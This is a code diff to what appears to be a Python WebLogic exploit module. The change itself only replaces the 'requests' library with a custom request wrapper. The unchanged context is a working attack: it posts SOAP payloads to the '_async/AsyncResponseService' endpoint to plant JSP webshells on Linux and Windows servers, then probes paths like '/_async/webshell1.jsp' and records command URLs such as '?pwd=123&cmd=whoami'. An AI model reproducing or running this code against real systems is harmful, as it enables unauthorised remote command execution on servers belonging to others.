@@ -9,7 +9,7 @@ See the file 'LICENSE' for copying permission
 
 
 from urllib.parse import urlparse
-import requests
+from lib.core.Request import request
 import time
 
 post_headers = {
@@ -47,10 +47,10 @@ def linux_check_1(url, webshell_path):
 
     try:
         attack_url = url + '/_async/AsyncResponseService'
-        requests.post(url=attack_url, data=linux_payload_1, headers=post_headers, timeout=5, verify=False)
+        request.post(url=attack_url, data=linux_payload_1, headers=post_headers, timeout=5, verify=False)
         jsp_path = url + '/_async/webshell1.jsp'
         time.sleep(1)
-        r = requests.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
+        r = request.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
         if r.status_code == 200:
             webshell_path.append("{}?pwd=123&cmd=whoami".format(jsp_path))
         else:
@@ -88,10 +88,10 @@ def linux_check_2(url, webshell_path):
 
     try:
         attack_url = url + '/_async/AsyncResponseService'
-        requests.post(url=attack_url, data=linux_payload_2, headers=post_headers, timeout=5, verify=False)
+        request.post(url=attack_url, data=linux_payload_2, headers=post_headers, timeout=5, verify=False)
         jsp_path = url + '/bea_wls_internal/webshell2.jsp'
         time.sleep(1)
-        r = requests.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
+        r = request.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
         if r.status_code == 200:
             webshell_path.append("{}?pwd=123&cmd=whoami".format(jsp_path))
         else:
@@ -151,12 +151,12 @@ def windows_check_1(url, webshell_path):
         </soapenv:Body></soapenv:Envelope>"""
     try:
         attack_url = url + '/_async/AsyncResponseService'
-        requests.post(url=attack_url, data=windows_payload_1_1, headers=post_headers, timeout=5, verify=False)
+        request.post(url=attack_url, data=windows_payload_1_1, headers=post_headers, timeout=5, verify=False)
         time.sleep(1)
-        requests.post(url=attack_url, data=windows_payload_1_2, headers=post_headers, timeout=5, verify=False)
+        request.post(url=attack_url, data=windows_payload_1_2, headers=post_headers, timeout=5, verify=False)
         time.sleep(1)
         jsp_path = url + '/_async/webshell3.jsp'
-        r = requests.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
+        r = request.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
         if r.status_code == 200:
             webshell_path.append("{}?pwd=123&cmd=whoami".format(jsp_path))
         else:
@@ -216,12 +216,12 @@ def windows_check_2(url, webshell_path):
         </soapenv:Body></soapenv:Envelope>"""
     try:
         attack_url = url + '/_async/AsyncResponseService'
-        requests.post(url=attack_url, data=windows_payload_2_1, headers=post_headers, timeout=5, verify=False)
+        request.post(url=attack_url, data=windows_payload_2_1, headers=post_headers, timeout=5, verify=False)
         time.sleep(1)
-        requests.post(url=attack_url, data=windows_payload_2_2, headers=post_headers, timeout=5, verify=False)
+        request.post(url=attack_url, data=windows_payload_2_2, headers=post_headers, timeout=5, verify=False)
         time.sleep(1)
         jsp_path = url + '/bea_wls_internal/webshell4.jsp'
-        r = requests.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
+        r = request.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
         if r.status_code == 200:
             webshell_path.append("{}?pwd=123&cmd=whoami".format(jsp_path))
         else:
@@ -245,7 +245,7 @@ def poc(url):
     # 首先判断attack_url是否可访问
     try:
         attack_url = url + '/_async/AsyncResponseService'
-        r = requests.get(url=attack_url, headers=get_headers, timeout=4, verify=False)
+        r = request.get(url=attack_url, headers=get_headers, timeout=4, verify=False)
         if r.status_code != 200:
             return []
     except:
